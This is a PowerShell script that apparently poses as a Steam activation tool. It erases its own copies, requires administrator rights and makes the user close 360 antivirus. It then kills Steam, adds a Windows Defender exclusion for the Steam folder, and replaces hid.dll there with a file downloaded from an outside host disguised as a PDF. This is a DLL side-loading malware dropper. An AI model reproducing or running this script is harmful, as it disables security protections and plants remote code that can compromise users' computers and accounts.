cls
Write-Host -NoNewline "          _____                _____                    _____                    _____                    _____          `r" -ForegroundColor:blue
Write-Host -NoNewline "         /\    \              /\    \                  /\    \                  /\    \                  /\    \         `r" -ForegroundColor:blue
Write-Host -NoNewline "        /::\    \            /::\    \                /::\    \                /::\    \                /::\____\        `r" -ForegroundColor:blue
Write-Host -NoNewline "       /::::\    \           \:::\    \              /::::\    \              /::::\    \              /::::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "      /::::::\    \           \:::\    \            /::::::\    \            /::::::\    \            /:::::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "     /:::/\:::\    \           \:::\    \          /:::/\:::\    \          /:::/\:::\    \          /::::::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "    /:::/__\:::\    \           \:::\    \        /:::/__\:::\    \        /:::/__\:::\    \        /:::/|::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "    \:::\   \:::\    \          /::::\    \      /::::\   \:::\    \      /::::\   \:::\    \      /:::/ |::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "  ___\:::\   \:::\    \        /::::::\    \    /::::::\   \:::\    \    /::::::\   \:::\    \    /:::/  |::|___|______  `r" -ForegroundColor:blue
Write-Host -NoNewline " /\   \:::\   \:::\    \      /:::/\:::\    \  /:::/\:::\   \:::\    \  /:::/\:::\   \:::\    \  /:::/   |::::::::\    \ `r" -ForegroundColor:blue
Write-Host -NoNewline "/::\   \:::\   \:::\____\    /:::/  \:::\____\/:::/__\:::\   \:::\____\/:::/  \:::\   \:::\____\/:::/    |:::::::::\____\`r" -ForegroundColor:blue
Write-Host -NoNewline "\:::\   \:::\   \::/    /   /:::/    \::/    /\:::\   \:::\   \::/    /\::/    \:::\  /:::/    /\::/    / ~~~~~/:::/    /`r" -ForegroundColor:blue
Write-Host -NoNewline " \:::\   \:::\   \/____/   /:::/    / \/____/  \:::\   \:::\   \/____/  \/____/ \:::\/:::/    /  \/____/      /:::/    / `r" -ForegroundColor:blue
Write-Host -NoNewline "  \:::\   \:::\    \      /:::/    /            \:::\   \:::\    \               \::::::/    /               /:::/    /  `r" -ForegroundColor:blue
Write-Host -NoNewline "   \:::\   \:::\____\    /:::/    /              \:::\   \:::\____\               \::::/    /               /:::/    /   `r" -ForegroundColor:blue
Write-Host -NoNewline "    \:::\  /:::/    /    \::/    /                \:::\   \::/    /               /:::/    /               /:::/    /    `r" -ForegroundColor:blue
Write-Host -NoNewline "     \:::\/:::/    /      \/____/                  \:::\   \/____/               /:::/    /               /:::/    /     `r" -ForegroundColor:blue
Write-Host -NoNewline "      \::::::/    /                                 \:::\    \                  /:::/    /               /:::/    /      `r" -ForegroundColor:blue
Write-Host -NoNewline "       \::::/    /                                   \:::\____\                /:::/    /               /:::/    /       `r" -ForegroundColor:blue
Write-Host -NoNewline "        \::/    /                                     \::/    /                \::/    /                \::/    /        `r" -ForegroundColor:blue
Write-Host -NoNewline "         \/____/                                       \/____/                  \/____/                  \/____/         `r" -ForegroundColor:blue

$filePathToDelete = Join-Path $env:USERPROFILE "x.ps1"
 if (Test-Path $filePathToDelete) {
    Remove-Item -Path $filePathToDelete
}
$desktopFilePathToDelete = Join-Path ([System.Environment]::GetFolderPath('Desktop')) "x.ps1"
if (Test-Path $desktopFilePathToDelete) {
    Remove-Item -Path $desktopFilePathToDelete
}

$steamRegPath = 'HKCU:\Software\Valve\Steam'
$localPath = -join ($env:LOCALAPPDATA,"\SteamActive")
if ((Test-Path $steamRegPath)) {
    $properties = Get-ItemProperty -Path $steamRegPath
    if ($properties.PSObject.Properties.Name -contains 'SteamPath') {
        $steamPath = $properties.SteamPath
    }
}

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[请重新打开Power shell 打开方式以管理员身份运行]" -ForegroundColor:red
    exit
}

function PwStart() {
    if(Get-Process "360Tray*" -ErrorAction Stop){
        while(Get-Process 360Tray* -ErrorAction Stop){
            Write-Host "[请先退出360安全卫士]" -ForegroundColor:Red
            Start-Sleep 1.5
        }
        PwStart

    }
    if(Get-Process "360sd*" -ErrorAction Stop)
    {
        while(Get-Process 360sd* -ErrorAction Stop){
            Write-Host "[请先退出360杀毒]" -ForegroundColor:Red
            Start-Sleep 1.5
        }
        PwStart
    }

    if ($steamPath -eq ""){
        Write-Host "[请检查您的Steam是否正确安装]" -ForegroundColor:Red
        exit
    }
    Write-Host "[ServerStart        OK]" -ForegroundColor:green
    Stop-Process -Name steam* -Force -ErrorAction Stop
    Start-Sleep 2
    if(Get-Process steam* -ErrorAction Stop){
        TASKKILL /F /IM "steam.exe" | Out-Null
        Start-Sleep 2
    }

    if (!(Test-Path $localPath)) {
        md $localPath | Out-Null
        if (!(Test-Path $localPath)) {
            New-Item $localPath -ItemType directory -Force | Out-Null
        }
    }

    $catchPath = -join ($steamPath,"\package\data")
    if ((Test-Path $catchPath)) {
        if ((Test-Path $catchPath)) {
            Remove-Item $catchPath -Recurse -Force | Out-Null
        }
    }

    try{
        Add-MpPreference -ExclusionPath $steamPath -ErrorAction Stop
        Start-Sleep 3
    }catch{}

    Write-Host "[Result->0          OK]" -ForegroundColor:green

    try{
        $d = $steamPath + "/version.dll"
        if (Test-Path $d) {
            Remove-Item $d -Recurse -Force -ErrorAction Stop | Out-Null #清除文件
        }
        $d = $steamPath + "/user32.dll"
        if (Test-Path $d) {
            Remove-Item $d -Recurse -Force -ErrorAction Stop | Out-Null #清除文件
        }
        $d = $steamPath + "/steam.cfg"
        if (Test-Path $d) {
            Remove-Item $d -Recurse -Force -ErrorAction Stop | Out-Null #清除文件
        }
        $d = $steamPath + "/hid.dll"
        if (Test-Path $d) {
            Remove-Item $d -Recurse -Force -ErrorAction Stop | Out-Null #清除文件
        }
    }catch{
        Write-Host "[异常残留请检查[$d]文件是否异常!]" -ForegroundColor:red
        exit
    }

    $downloadData = "http://steam.work/pwsDwFile/bcfc1e52ca77ad82122dfe4c9560f3ec.pdf"
    $downloadLink = "http://steam.work/pwsDwFile/9b96dac2bb0ba18d56068fabc5b17185.pdf"
    
    irm -Uri $downloadLink -OutFile $d -ErrorAction Stop
    Write-Host "[Result->1          OK]" -ForegroundColor:green
    $d = $localPath + "/hid"
    irm -Uri $downloadData -OutFile $d -ErrorAction Stop
    Write-Host "[Result->2          OK]" -ForegroundColor:green
    
    Start-Sleep 1

    Start steam://
    Write-Host "[连接服务器成功请在Steam输入激活码 3秒后自动关闭]" -ForegroundColor:green
    Start-Sleep 3
    exit

}

PwStart